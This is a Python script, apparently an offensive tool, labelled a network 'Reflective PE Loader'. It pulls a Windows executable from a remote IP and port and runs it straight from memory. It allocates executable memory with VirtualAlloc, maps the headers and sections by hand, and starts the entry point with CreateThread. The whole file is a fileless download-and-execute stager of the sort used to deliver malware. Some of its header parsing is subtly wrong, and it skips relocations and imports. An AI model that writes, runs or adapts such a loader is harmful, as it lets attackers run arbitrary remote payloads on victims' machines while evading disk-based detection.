import ctypes
import struct
import argparse
import socket

def recv_pe_file(ip, port):
    with socket.create_connection((ip, port)) as s:
        size_data = s.recv(4)
        if len(size_data) < 4:
            raise ValueError("Failed to receive size header")
        pe_size = struct.unpack('<I', size_data)[0]
        print(f"[+] Expecting {pe_size} bytes")

        pe_data = b''
        while len(pe_data) < pe_size:
            chunk = s.recv(4096)
            if not chunk:
                break
            pe_data += chunk

        if len(pe_data) != pe_size:
            raise ValueError("Incomplete PE received")

        print(f"[+] Received PE file ({len(pe_data)} bytes)")
        return pe_data

def load_pe(pe_bytes):
    kernel32 = ctypes.windll.kernel32
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)

    e_lfanew = struct.unpack_from("<I", pe_bytes, 0x3C)[0]
    nt_headers_offset = e_lfanew

    signature = struct.unpack_from("<I", pe_bytes, nt_headers_offset)[0]
    if signature != 0x4550:
        raise ValueError("Invalid PE signature")

    machine = struct.unpack_from("<H", pe_bytes, nt_headers_offset + 4)[0]
    is_64bit = struct.unpack_from("<H", pe_bytes, nt_headers_offset + 24)[0] == 0x20b

    entry_point_rva = struct.unpack_from("<I", pe_bytes, nt_headers_offset + 40)[0]
    image_base = struct.unpack_from("<Q" if is_64bit else "<I", pe_bytes, nt_headers_offset + 24)[0]
    size_of_image = struct.unpack_from("<I", pe_bytes, nt_headers_offset + 80)[0]
    size_of_headers = struct.unpack_from("<I", pe_bytes, nt_headers_offset + 60)[0]
    size_of_optional_header = struct.unpack_from("<H", pe_bytes, nt_headers_offset + 20)[0]
    section_table_offset = nt_headers_offset + 24 + size_of_optional_header
    num_sections = struct.unpack_from("<H", pe_bytes, nt_headers_offset + 6)[0]

    print(f"[+] Preferred image base: 0x{image_base:X}")
    print(f"[+] Entry point RVA: 0x{entry_point_rva:X}")
    print(f"[+] Size of image: {size_of_image} bytes")
    print(f"[+] Number of sections: {num_sections}")

    ptr = kernel32.VirtualAlloc(None, size_of_image, 0x3000, 0x40)
    if not ptr:
        raise MemoryError("VirtualAlloc failed")

    print(f"[+] Allocated memory at: 0x{ptr:X}")

    header_buf = (ctypes.c_char * size_of_headers).from_buffer_copy(pe_bytes[:size_of_headers])
    kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), header_buf, size_of_headers)

    for i in range(num_sections):
        offset = section_table_offset + (40 * i)
        virtual_address = struct.unpack_from("<I", pe_bytes, offset + 12)[0]
        raw_data_ptr = struct.unpack_from("<I", pe_bytes, offset + 20)[0]
        raw_data_size = struct.unpack_from("<I", pe_bytes, offset + 16)[0]

        print(f"[+] Section {i}: VA=0x{virtual_address:X}, RawSize={raw_data_size}, RawPtr=0x{raw_data_ptr:X}")

        if raw_data_ptr + raw_data_size > len(pe_bytes):
            print(f"[!] Skipping section {i} due to invalid bounds")
            continue

        dest = ctypes.c_void_p(ptr + virtual_address)
        src_buf = (ctypes.c_char * raw_data_size).from_buffer_copy(pe_bytes[raw_data_ptr:raw_data_ptr + raw_data_size])
        kernel32.RtlMoveMemory(dest, src_buf, raw_data_size)

    entry_point = ptr + entry_point_rva
    thread_id = ctypes.c_ulong(0)
    handle = kernel32.CreateThread(
        None,
        0,
        ctypes.c_void_p(entry_point),
        None,
        0,
        ctypes.byref(thread_id)
    )
    kernel32.WaitForSingleObject(handle, -1)

def main():
    parser = argparse.ArgumentParser(description="Reflective PE Loader (Network)")
    parser.add_argument("-i", "--ip", required=True, help="Sender IP")
    parser.add_argument("-p", "--port", type=int, required=True, help="Sender port")
    args = parser.parse_args()

    pe_data = recv_pe_file(args.ip, args.port)
    load_pe(pe_data)

if __name__ == "__main__":
    main()
